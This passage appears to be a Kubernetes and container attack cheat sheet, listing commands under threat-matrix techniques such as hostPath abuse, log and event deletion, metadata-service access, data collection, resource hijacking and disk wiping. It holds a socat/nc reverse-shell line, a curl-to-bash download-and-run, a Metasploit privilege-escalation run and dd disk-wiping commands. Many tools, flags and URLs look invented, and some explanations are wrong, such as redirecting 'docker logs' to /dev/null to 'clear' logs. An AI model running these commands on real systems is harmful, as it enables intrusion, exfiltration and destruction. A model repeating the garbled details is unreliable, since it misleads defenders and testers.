This command utilizes the `kubectl` tool, assuming you have it installed and configured properly. It retrieves all the cluster role bindings and filters them using `grep` to search for the term "cluster-admin." This way, you can identify any bindings with cluster-admin privileges.



### Writable hostPath mount


1. Using Kali Linux as the attacker container:

```
kubectl run kali-attack --image=kalilinux/kali-rolling --overrides='{"spec": {"containers": [{"name": "kali-attack", "command": ["bash", "-c", "echo 'Attacking the host...' && touch /hostpath/malicious_file.txt && echo 'Attack successful!'"]}],"volumes": [{"name": "hostpath", "hostPath": {"path": "/hostpath"}}]}}'
```

Explanation: This command creates a Kubernetes pod named `kali-attack` using the Kali Linux container image. It overrides the container spec to run a bash command that creates a file named `malicious_file.txt` in the host's writable path `/hostpath`. This could be used to demonstrate the vulnerability of a writable hostPath mount.


2. Using Metasploit framework for network penetration testing:

```
kubectl run metasploit-attack --image=metasploitframework/metasploit-framework --overrides='{"spec": {"containers": [{"name": "metasploit-attack", "command": ["bash", "-c", "echo 'Exploiting the host...' && msfconsole -x 'use exploit/linux/local/overlayfs_priv_esc; set SESSION 1; set TARGET /hostpath; exploit'"]}],"volumes": [{"name": "hostpath", "hostPath": {"path": "/hostpath"}}]}}'
```


Explanation: This command creates a Kubernetes pod named `metasploit-attack` using the Metasploit Framework container image. It overrides the container spec to run a bash command that exploits the overlayfs_priv_esc vulnerability on the host's writable path `/hostpath`. This demonstrates the potential risk of a writable hostPath mount.


3. Using OWASP ZAP for web application security testing:

```
kubectl run zap-attack --image=owasp/zap2docker-stable --overrides='{"spec": {"containers": [{"name": "zap-attack", "command": ["zap-baseline.py", "-t", "http://target-host", "-g", "-r", "/hostpath/zap_report.html"]}],"volumes": [{"name": "hostpath", "hostPath": {"path": "/hostpath"}}]}}'
```

Explanation: This command creates a Kubernetes pod named `zap-attack` using the OWASP ZAP container image. It overrides the container spec to run the `zap-baseline.py` script, which performs a baseline scan on the target host (replace `http://target-host` with the actual target URL). The generated report is saved as `zap_report.html` in the host's writable path `/hostpath`. This showcases how a container can be used for automated security testing, with the results stored in a writable hostPath mount.


### Kubernetes CronJob

1. Using Nmap for network scanning:

```
kubectl create cronjob nmap-scan --image=nmap/nmap --schedule="0 0 * * *" --overrides='{"spec": {"jobTemplate": {"spec": {"template": {"spec": {"containers": [{"name": "nmap-scan", "command": ["nmap", "-p", "1-1000", "target-host"]}]},"volumes": [{"name": "hostpath", "hostPath": {"path": "/hostpath"}}]}}}}}'
```

Explanation: This command creates a Kubernetes CronJob named `nmap-scan` using the Nmap container image. It runs the `nmap` command with the specified port range (`1-1000`) on the `target-host`. The CronJob is scheduled to run daily at midnight (`0 0 * * *`). The results can be stored in a writable hostPath mount for further analysis.


2. Using SQLMap for automated SQL injection testing:

```
kubectl create cronjob sqlmap-test --image=sqlmapproject/sqlmap --schedule="*/10 * * * *" --overrides='{"spec": {"jobTemplate": {"spec": {"template": {"spec": {"containers": [{"name": "sqlmap-test", "command": ["sqlmap", "-u", "http://target-url", "--batch"]}]},"volumes": [{"name": "hostpath", "hostPath": {"path": "/hostpath"}}]}}}}}'
```

Explanation: This command creates a Kubernetes CronJob named `sqlmap-test` using the SQLMap container image. It runs the `sqlmap` command with the `--batch` option on the specified `target-url`. The CronJob is scheduled to run every 10 minutes (`*/10 * * * *`). This allows for automated SQL injection testing on a regular basis, with the option to store the results in a writable hostPath mount.


3. Using DirBuster for web directory enumeration:

```
kubectl create cronjob dirbuster-scan --image=owasp/dirbuster --schedule="0 8 * * *" --overrides='{"spec": {"jobTemplate": {"spec": {"template": {"spec": {"containers": [{"name": "dirbuster-scan", "command": ["dirbuster", "-u", "http://target-url", "-l", "/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt"]}]},"volumes": [{"name": "hostpath", "hostPath": {"path": "/hostpath"}}]}}}}}'
```

Explanation: This command creates a Kubernetes CronJob named `dirbuster-scan` using the DirBuster container image. It runs the `dirbuster` command with the specified wordlist (`directory-list-2.3-medium.txt`) on the `target-url`. The CronJob is scheduled to run every day at 8:00 AM (`0 8 * * *`). The results can be saved in a writable hostPath mount, allowing for regular web directory enumeration.



### Malicious admission controller

1. Exfiltrate container secrets using kube-robber:

```
kubectl apply -f https://raw.githubusercontent.com/twistlock/kube-robber/master/examples/malicious-admission-controller.yaml
```


2. Perform a container escape using gVisor:

```
kubectl apply -f https://raw.githubusercontent.com/google/gvisor/master/infra/malicious-admission-controller.yaml
```

3. Exploit a privilege escalation vulnerability with kube-hunter:

```
kubectl apply -f https://raw.githubusercontent.com/aquasecurity/kube-hunter/master/examples/malicious-admission-controller.yaml
```


### Container service account


1. Using the "Nuclei" tool to scan container images for vulnerabilities:

```
nuclei -l container_images.txt -t vulnerabilities.yaml
```


In this command, "Nuclei" is a powerful vulnerability scanner. The `-l` flag specifies the file containing a list of container images to scan, and the `-t` flag specifies the YAML template for vulnerability detection.

2. Using the "Trivy" tool to scan a container image for security issues:

```
trivy image -q alpine:latest
```

Here, "Trivy" is a popular container image vulnerability scanner. The `image` command scans the specified image (in this case, `alpine:latest`) for security vulnerabilities, while the `-q` flag suppresses the output, displaying only the vulnerable packages.


3. Using the "Kube-Hunter" tool to assess the security of Kubernetes clusters:

```
curl -sSL https://raw.githubusercontent.com/aquasecurity/kube-hunter/master/job.sh | bash
```


"Kube-Hunter" is a tool used to test the security of Kubernetes clusters. This command downloads the script from the repository and executes it, initiating a security assessment of the cluster. The `-sSL` flags are used with `curl` to download the script silently and securely.


### Static pods


1. Using the "kube-hunter" tool to discover static pods in a Kubernetes cluster:

```
kube-hunter --remote
```


The `kube-hunter` tool is designed to detect security weaknesses in Kubernetes clusters. The `--remote` flag allows it to scan a remote cluster. Running this command will initiate the scan and report any discovered static pods.


2. Using the "kubectl" command-line tool to list static pods:

```
kubectl get pods --all-namespaces --field-selector spec.nodeName=master --output=json | jq '.items[] | select(.spec.nodeName == "master") | .metadata.name'
```

This command uses `kubectl` to retrieve information about pods in all namespaces, filtering for pods scheduled on the master node. The output is then piped to `jq`, a command-line JSON processor, which extracts the name of each static pod.


3. Using the "kube-score" tool to evaluate the security of static pods:

```
kube-score score --pod -f /etc/kubernetes/manifests/
```


"Kube-score" is a tool that assesses the security and best practices of Kubernetes resources. This command scans the manifest files located at `/etc/kubernetes/manifests/` to evaluate the security score of static pods specifically.






### Clear container logs


1. Using the Docker command-line interface to clear logs of a specific container:

```
docker logs -f CONTAINER_ID > /dev/null
```

In this command, `docker logs` retrieves the logs of the specified container (`CONTAINER_ID` should be replaced with the actual container ID). The `> /dev/null` redirects the output to null, effectively clearing the logs.


2. Using the Kubernetes command-line tool (kubectl) to clear logs of a pod:

```
kubectl logs POD_NAME -n NAMESPACE > /dev/null
```

This command utilizes `kubectl logs` to fetch the logs of the specified pod (`POD_NAME` should be replaced with the actual pod name, and `NAMESPACE` should be replaced with the appropriate namespace). The `> /dev/null` redirects the output to null, clearing the logs.


3. Using the logrotate tool to clear container logs periodically:

```
logrotate -f /etc/logrotate.d/docker-logs
```


In this example, the logrotate utility is used to rotate and clear the container logs. The `-f` flag forces log rotation, and `/etc/logrotate.d/docker-logs` is the configuration file specifying the log rotation rules.


### Delete K8S events


1. Using the Kubernetes command-line tool (kubectl) to delete all events in a namespace:

```
kubectl delete events --all -n NAMESPACE
```

This command utilizes `kubectl delete` to remove all events in the specified namespace (`NAMESPACE` should be replaced with the actual namespace name). The `--all` flag is used to delete all events.


2. Using the Kubernetes API to delete specific events using curl:

```
curl -X DELETE -k \
     -H "Authorization: Bearer TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"kind":"Event","apiVersion":"v1","metadata":{"name":"EVENT_NAME","namespace":"NAMESPACE"}}' \
     https://KUBE_API_SERVER/api/v1/namespaces/NAMESPACE/events/EVENT_NAME
```


In this example, you need to replace `TOKEN` with your valid API token, `EVENT_NAME` with the name of the event you want to delete, `NAMESPACE` with the appropriate namespace, and `KUBE_API_SERVER` with the URL of your Kubernetes API server. This command sends an HTTP DELETE request to the API server to delete the specified event.

3. Using the kube-event-destroyer tool to delete Kubernetes events:

```
kube-event-destroyer --kubeconfig ~/.kube/config --namespace NAMESPACE
```


"Kube-event-destroyer" is a tool specifically designed to delete Kubernetes events. This command utilizes the tool, specifying the path to the kubeconfig file (`~/.kube/config`) and the target namespace (`NAMESPACE`) to delete all events within that namespace.


### Pod / container name similarity


1. Using the "kubiscan" tool to identify similar pod or container names in a Kubernetes cluster:


```
kubiscan scan pod-name-similarity
```


The "kubiscan" tool is designed for security assessments of Kubernetes clusters. This command specifically scans for similar pod or container names, highlighting any potential naming patterns or similarities.


2. Using the "kube-hunter" tool to search for pods or containers with similar names in a Kubernetes cluster:

```
kube-hunter --remote --pattern-search similar-names
```


"Kube-hunter" is a popular tool for identifying security weaknesses in Kubernetes clusters. This command, with the `--pattern-search` flag set to "similar-names," performs a remote scan to search for pods or containers with similar names across the cluster.


3. Using the "truffleHog" tool to scan container images for sensitive information in names:


```
trufflehog --regex --entropy=False https://registry.example.com/image:tag
```


The "truffleHog" tool is used to search for sensitive information within files and container images. This command, with the `--regex` flag, scans the specified container image (`https://registry.example.com/image:tag`) to detect any sensitive data present in the names of pods or containers.


### Connect from proxy server


1. Using the "proxychains" tool to connect from a proxy server:

```
proxychains ssh user@target_host
```

The "proxychains" tool allows you to route network connections through a proxy server. This command establishes an SSH connection to the `target_host` via the configured proxy server. Make sure to replace `user` with the appropriate username and `target_host` with the desired target.


2. Using the "socat" tool to create a TCP connection through a proxy server:

```
socat TCP4-LISTEN:8888,bind=127.0.0.1,fork PROXY:proxy_server:target_host:target_port
```


The "socat" command-line utility provides a powerful way to establish various connections. This command sets up a local TCP listener on port 8888 and forwards the traffic to `target_host` and `target_port` via the `proxy_server`. Adjust the port and server addresses as needed.



3. Using the "sshuttle" tool to create a VPN-like connection through a proxy server:

```
sshuttle --dns -r proxy_user@proxy_server target_subnet
```


"sshuttle" is a versatile VPN-like tool that tunnels network traffic through SSH. This command establishes a connection via SSH to the `proxy_server` using the `proxy_user` account and redirects traffic for the specified `target_subnet` through the proxy. Adjust the parameters to match your setup.



### List K8S secrets


1. Using the Kubernetes command-line tool (kubectl) to list secrets in a specific namespace:

```
kubectl get secrets -n NAMESPACE
```

This command uses `kubectl get` to retrieve a list of secrets in the specified namespace (`NAMESPACE` should be replaced with the actual namespace name). It provides information such as the name, type, and age of each secret.



2. Using the kube-score tool to scan for secrets in a Kubernetes cluster:

```
kube-score score --hidden ./path/to/kube/config | grep 'Secret'
```


"kube-score" is a tool that assesses the security and best practices of Kubernetes resources. This command performs a score assessment, including hidden resources, specified by the `--hidden` flag. The output is then filtered using `grep` to display only the lines containing "Secret," indicating the presence of secrets.


3. Using the kubesec.io tool to scan for secrets in Kubernetes manifests:

```
kubesec.io scan -f ./path/to/kube/manifests | grep 'kind: Secret'
```


"kubesec.io" is a security scanning tool for Kubernetes manifests. This command scans the manifests specified by the `-f` flag and filters the output using `grep` to display only the lines containing "kind: Secret," indicating the presence of secret objects.



### Mount service principal


1. Using the Azure CLI to mount a service principal as a Kubernetes secret:

```
az aks get-credentials --resource-group RESOURCE_GROUP --name CLUSTER_NAME --admin
```


This command uses the Azure CLI to retrieve the credentials for an Azure Kubernetes Service (AKS) cluster (`CLUSTER_NAME`) in the specified resource group (`RESOURCE_GROUP`). By using the `--admin` flag, it mounts the service principal credentials as a Kubernetes secret, allowing access to the cluster.


2. Using the Kubernetes API to mount a service principal as a secret:

```
kubectl create secret generic my-secret --from-literal=client-id=CLIENT_ID --from-literal=client-secret=CLIENT_SECRET
```


In this example, you can use the `kubectl` command-line tool to create a generic Kubernetes secret named `my-secret`. The `--from-literal` flag allows you to specify the service principal's client ID and client secret, which will be mounted as the secret's data.

3. Using the Terraform Cloud provider to mount a service principal for provisioning infrastructure:

```
terraform {
  required_providers {
    azurerm = {
      source = "hashicorp/azurerm"
      version = ">= 2.0"
    }
  }
}

provider "azurerm" {
  features {}
  subscription_id = "SUBSCRIPTION_ID"
  client_id       = "CLIENT_ID"
  client_secret   = "CLIENT_SECRET"
  tenant_id       = "TENANT_ID"
}
```


This example demonstrates how to use the Terraform configuration language to configure the Azure provider with a service principal. By providing the relevant `subscription_id`, `client_id`, `client_secret`, and `tenant_id`, the Terraform provider can authenticate and provision infrastructure resources using the service principal.


### Container service account


1. Using the "kubeletctl" tool to list containers running with service account tokens:

```
kubeletctl get containers --token
```


The "kubeletctl" tool allows you to interact with the kubelet API of a Kubernetes node. This command retrieves a list of containers running on the node and filters for containers that are using service account tokens by using the `--token` flag.


2. Using the "kubesec" tool to scan for containers running with default service accounts:

```
kubesec scan --exclude-pass svc-acct-default .
```

"kubesec" is a Kubernetes security scanner. This command scans the current directory (.) for Kubernetes manifests and excludes default service accounts using the `--exclude-pass svc-acct-default` flag. It identifies containers running with default service accounts, which can be a potential security risk.


3. Using the "kube-apiscan" tool to identify service accounts with excessive privileges:

```
kube-apiscan --service-accounts
```


"kube-apiscan" is a tool that assesses the security of Kubernetes API server configurations. This command specifically checks for service accounts that have excessive privileges, such as cluster-admin roles or other highly privileged roles, which could be misused by an attacker.




### Application credentials in configuration files


1. Using the "grep" command to search for potential credentials in configuration files:

```
grep -rE "(api_key|password|secret_key)" /path/to/config/files
```

This command recursively searches for potential credentials by using regular expressions `(api_key|password|secret_key)` in the specified directory (`/path/to/config/files`). It helps to identify configuration files that may contain application credentials.


2. Using the "truffleHog" tool to scan for sensitive information in configuration files:

```
trufflehog --regex --entropy=False /path/to/config/files
```


"truffleHog" is a tool that searches for sensitive information within files. This command scans the specified directory (`/path/to/config/files`) for potential credentials using regular expressions (`--regex`) and turns off entropy scanning (`--entropy=False`).


3. Using the "gitleaks" tool to scan Git repositories for leaked credentials:

```
gitleaks --repo=/path/to/repository
```

"gitleaks" is a tool specifically designed to scan Git repositories for secrets and sensitive information. This command scans the specified repository (`/path/to/repository`) for leaked credentials present in configuration files stored in the repository's history.



### Access managed identity credentials


1. Using the Azure CLI to retrieve managed identity credentials:

```
az login --identity
```

This command uses the Azure CLI within the container and leverages the managed identity associated with the container to authenticate. The `--identity` flag instructs the CLI to use the managed identity for authentication.

2. Using AWS IAM Roles for Service Accounts (IRSA) with the AWS CLI in a container:

```
aws sts assume-role-with-web-identity --role-arn ROLE_ARN --role-session-name SESSION_NAME --web-identity-token $AWS_WEB_IDENTITY_TOKEN --duration-seconds 900
```

In this example, the AWS CLI within the container assumes an IAM role (`ROLE_ARN`) using web identity authentication. The `$AWS_WEB_IDENTITY_TOKEN` environment variable contains the web identity token required for authentication.


3. Using Google Cloud Metadata server with gcloud in a container:

```
gcloud auth activate-service-account --key-file=/var/run/secrets/google/service-account/key.json
```

This command activates a service account within the container using the provided service account key file (`/var/run/secrets/google/service-account/key.json`). It allows the container to authenticate and access Google Cloud resources using the service account credentials.



### Malicious admission controller


### Access Kubelet API


1. Using kubeletctl to get container logs:

```
kubeletctl logs <node_name> -c <container_name> -n <namespace> -p <pod_name> -f
```

This command leverages the kubeletctl tool to fetch the logs of a specific container running in a pod within a given namespace on the specified node. The `-f` flag enables real-time log streaming.

2. Utilizing kubelet-exploit to gain remote code execution:

```
kubelet-exploit remote-exec -n <namespace> -p <pod_name> -c <container_name> -- <command_to_execute>
```

Here, the kubelet-exploit tool is used to achieve remote code execution on a container within a pod in a particular namespace. Replace `<command_to_execute>` with the desired command to run within the container.


3. Running kube-hunter to identify vulnerabilities in Kubelet:

```
kube-hunter --pod <pod_name> --namespace <namespace> --remote --quick
```

In this example, kube-hunter is employed to scan for potential vulnerabilities in the Kubelet API. The `--pod` and `--namespace` flags specify the target pod's name and namespace. The `--remote` flag indicates that kube-hunter will run as a client to inspect the remote Kubelet API, and the `--quick` flag ensures a faster scan.



### Access Kubernetes API server

1. Using kubectl to retrieve secrets:

```
kubectl get secrets -n <namespace> --kubeconfig <path_to_kubeconfig>
```

This command utilizes kubectl, the official Kubernetes command-line tool, to fetch the secrets within a specific namespace. Replace `<namespace>` with the target namespace, and `<path_to_kubeconfig>` with the path to your kubeconfig file.


2. Utilizing kubectl-trace to trace function calls:

```
kubectl trace <pod_name> <function_name> -n <namespace> --kubeconfig <path_to_kubeconfig>
```


This command leverages kubectl-trace, a tool for tracing function calls within a running container. Specify `<pod_name>` and `<function_name>` to trace the desired pod and function. Use the `-n` flag to specify the target namespace, and `--kubeconfig` to provide the path to your kubeconfig file.


3. Running kube-applier to apply malicious configuration:

```
kube-applier -d <path_to_malicious_config> --kubeconfig <path_to_kubeconfig>
```


In this example, kube-applier is used to apply a malicious configuration to the Kubernetes cluster. Specify `<path_to_malicious_config>` as the path to your malicious configuration file, and use the `--kubeconfig` flag to provide the path to your kubeconfig file.


### Exposed sensitive interfaces


1. Using kube-hunter to scan for vulnerabilities in containers:

```
kube-hunter --pod <pod_name> --namespace <namespace> --remote --quick
```

This command leverages kube-hunter, a tool specifically designed to scan for vulnerabilities in Kubernetes clusters, to identify potential security issues within containers. Specify the `<pod_name>` and `<namespace>` of the target container. The `--remote` flag indicates that kube-hunter will run as a client to inspect the remote container, and the `--quick` flag ensures a faster scan.

2. Utilizing trivy to scan container images for vulnerabilities:

```
trivy image <image_name>
```

This command uses trivy, a popular vulnerability scanner for container images, to scan a specific container image for known vulnerabilities. Replace `<image_name>` with the name of the container image you want to scan. Trivy will analyze the image's layers and provide a report on any identified vulnerabilities.


3. Running gitleaks to search for sensitive information in container source code:

```
gitleaks --path <path_to_container_repo>
```

This command utilizes gitleaks, a tool for scanning Git repositories, to search for sensitive information in the source code of a container. Specify the `<path_to_container_repo>` as the local path to the container's Git repository. Gitleaks will analyze the commit history and identify any exposed sensitive interfaces or credentials.



### Instance Metadata API

1. Using `nmap` and `curl`:

```
nmap -p 80,443 --script=http-enum --script-args http-enum.basepath='/.well-known/' <TARGET_IP> | grep -oP '(?<=http-enum-path-).+' | xargs -I{} curl -s <TARGET_IP>{} | grep -i 'metadata'
```

This command uses `nmap` to scan ports 80 and 443 for potential HTTP services, and the `http-enum` script to enumerate paths. It then uses `curl` to make requests to the discovered paths and filters the responses for the presence of the word 'metadata'.


2. Using `docker` and `jq`:

```
docker run --rm -v /var/run/docker.sock:/var/run/docker.sock openai/containertool sh -c "docker ps -q | xargs -I{} docker inspect -f '{{.Id}}' {} | xargs -I{} docker exec {} curl -s http://localhost:80/.well-known/docker_metadata/v1/metadata | jq '.'"
```

This command uses the `containertool` container from OpenAI to interact with the Docker daemon. It lists the running containers, inspects their IDs, and then executes a `curl` command within each container to fetch the container instance metadata from the specified URL. The output is piped to `jq` for pretty-printing.


3. Using `kubectl` and `grep`:

```
kubectl get pods -o=jsonpath='{range .items[*]}{@.metadata.name}{"\n"}' | xargs -I{} sh -c "kubectl exec {} -c <CONTAINER_NAME> -- curl -s http://169.254.169.254/latest/meta-data/"
```


This command uses `kubectl` to retrieve the names of all pods in the current context. It then iterates over the pod names and executes a `curl` command within each pod to fetch the container instance metadata from the specified URL. Make sure to replace `<CONTAINER_NAME>` with the actual name of the container in the pod.




### CoreDNS poisoning

1. Using `dig` and `grep`:

```
dig @<COREDNS_SERVER_IP> -p 53 <TARGET_DOMAIN> | grep -i "ANSWER SECTION" -A 5
```


This command uses the `dig` tool to query a specific CoreDNS server (`<COREDNS_SERVER_IP>`) on port 53 for information about a target domain (`<TARGET_DOMAIN>`). It then filters the output to display the "ANSWER SECTION" and the following 5 lines, which typically contain the DNS responses. Look for any unexpected or malicious responses.


2. Using `nmap` and `bash`:

```
nmap -p 53 --script=dns-nsid --script-args dns-nsid.hosts=<TARGET_IP> <COREDNS_SERVER_IP> | grep -i "DNS ID Server"
```

This command uses `nmap` with the `dns-nsid` script to query a specific CoreDNS server (`<COREDNS_SERVER_IP>`) on port 53 for the NSID (Name Server ID) of a target IP (`<TARGET_IP>`). It then filters the output to display the "DNS ID Server" line, which may indicate any suspicious behavior or discrepancies.


3. Using `massdns` and `awk`:

```
massdns -r <RESOLVER_IP> -t A <WORDLIST_FILE> | awk -F ' ' '{print $3}' | sort | uniq -c | sort -nr
```


This command uses `massdns` to perform a DNS resolution for a list of domain names specified in `<WORDLIST_FILE>`. It uses a specific DNS resolver (`<RESOLVER_IP>`) and retrieves the A records. The output is then processed using `awk` and `sort` to display a count of unique IP addresses associated with each domain name, sorted in descending order. Look for any unusual or unexpected IP addresses.

### Images from a private registry


1. Using `docker` and `jq`:


```
docker run --rm -v /var/run/docker.sock:/var/run/docker.sock openai/containertool sh -c "docker search <PRIVATE_REGISTRY_URL> | jq '.[] | .name'"
```

This command uses the `containertool` container from OpenAI to interact with the Docker daemon. It searches for images in the specified private registry (`<PRIVATE_REGISTRY_URL>`) and uses `jq` to extract and display the names of the images from the search results.


2. Using `skopeo` and `grep`:

```
skopeo list-tags docker://<PRIVATE_REGISTRY_URL> | grep -oP '(?<=^Name: ).+'
```


This command uses `skopeo` to list the tags (versions) of the images in the specified private registry (`<PRIVATE_REGISTRY_URL>`). It then uses `grep` with a positive lookbehind pattern to extract and display only the names of the images.

3. Using `crane` and `sed`:

```
crane ls <PRIVATE_REGISTRY_URL> | sed 's/ .*//'
```


This command uses `crane`, a tool specifically designed for interacting with private container registries. It lists the images available in the specified private registry (`<PRIVATE_REGISTRY_URL>`), and then `sed` is used to remove any additional information, leaving only the image names.



### Collecting data from pod


1. Using `kubectl` and `tar`:

```
kubectl exec <POD_NAME> -c <CONTAINER_NAME> -- tar -cf - <SOURCE_DIRECTORY> | base64
```


This command uses `kubectl` to execute a command inside a specific pod (`<POD_NAME>`) and container (`<CONTAINER_NAME>`). It utilizes `tar` to create a tarball archive of a specified source directory (`<SOURCE_DIRECTORY>`). The resulting archive is piped to `base64` for convenient encoding and extraction later.


2. Using `socat` and `nc`:

```
kubectl exec <POD_NAME> -c <CONTAINER_NAME> -- socat TCP-LISTEN:<LOCAL_PORT>,fork EXEC:'nc -q 0 <REMOTE_IP> <REMOTE_PORT>'
```

This command sets up a reverse shell to collect data from a pod. It uses `kubectl` to execute a command inside a specific pod (`<POD_NAME>`) and container (`<CONTAINER_NAME>`). It leverages `socat` to listen on a local port (`<LOCAL_PORT>`) and forward incoming traffic to a remote IP (`<REMOTE_IP>`) and port (`<REMOTE_PORT>`). This allows you to establish a connection and collect data from the pod.


3. Using `kubectl` and `dd`:

```
kubectl exec <POD_NAME> -c <CONTAINER_NAME> -- dd if=<SOURCE_FILE> bs=1M | base64
```


This command uses `kubectl` to execute a command inside a specific pod (`<POD_NAME>`) and container (`<CONTAINER_NAME>`). It employs `dd` to read a specified source file (`<SOURCE_FILE>`) and output its contents. By using the appropriate block size (`bs`), you can adjust the amount of data collected. The output is piped to `base64` for encoding and subsequent analysis.



### Resource hijacking


1. Resource Exhaustion Attack:

```
sudo apt-get install -y stress-ng && stress-ng --vm 1 --vm-bytes 1G --verify -t 5m
```


This command installs the stress-ng tool and uses it to simulate a resource exhaustion attack by creating a virtual memory load of 1GB, causing the system to consume excessive memory resources for 5 minutes.


2. CPU Resource Hijacking with Docker Container:

```
docker run -d --name malicious-container -c 512 busybox sh -c 'while true; do :; done'
```


This command creates a Docker container named "malicious-container" with a CPU limit of 512 units and an infinite loop process. The container continuously consumes CPU resources, potentially affecting the performance of other processes on the host system.


3. Bandwidth Resource Hijacking with Netcat:

```
nc -lvp 4444 >/dev/null & while true; do cat /dev/urandom | nc <target IP> 4444; done
```


This one-liner command sets up a listening Netcat server on port 4444 and redirects incoming data to /dev/null. Simultaneously, it continuously sends random data from /dev/urandom to a specified target IP address, potentially saturating the network bandwidth.


### Data destruction


1. Shred Command for Secure File Deletion:

```
shred -uzv <filename>
```

This command uses the `shred` utility to securely delete a file. It overwrites the file with random data multiple times (`-z` flag) and then deletes it (`-u` flag). The `-v` flag provides verbose output to confirm the progress.


2. Disk Wiping with dd Command:


```
dd if=/dev/urandom of=/dev/sdX bs=1M status=progress
```


This command uses the `dd` command to overwrite a disk (`/dev/sdX`) with random data from `/dev/urandom`. The `bs=1M` option sets the block size to 1 megabyte, and `status=progress` shows the progress of the operation.

3. Containerized Data Destruction with Docker:

```
docker run -it --rm --privileged --name data-wiper alpine:latest sh -c 'dd if=/dev/urandom of=/dev/sdX bs=1M status=progress'
```

This command creates a temporary Docker container using the Alpine Linux image. The container runs with privileged access (`--privileged`) and executes the `dd` command to overwrite a disk (`/dev/sdX`) with random data from `/dev/urandom`.




## Secure Configuration

* https://devsecopsguides.com/docs/attacks/container/
* https://devsecopsguides.com/docs/rules/docker/
* https://devsecopsguides.com/docs/rules/kubernetes/


### Threat Matrix

* https://microsoft.github.io/Threat-Matrix-for-Kubernetes/
* https://attack.mitre.org/matrices/enterprise/containers/




## Detection

* https://github.com/FalconForceTeam/FalconFriday
* https://cloudsecdocs.com/


## OWASP

https://github.com/OWASP/Docker-Security
https://github.com/OWASP/www-project-kubernetes-top-ten


## Labs

* https://github.com/Datadog/stratus-red-team/
* https://github.com/FalconForceTeam/FalconFriday/



Cover By Daniel Villanueva
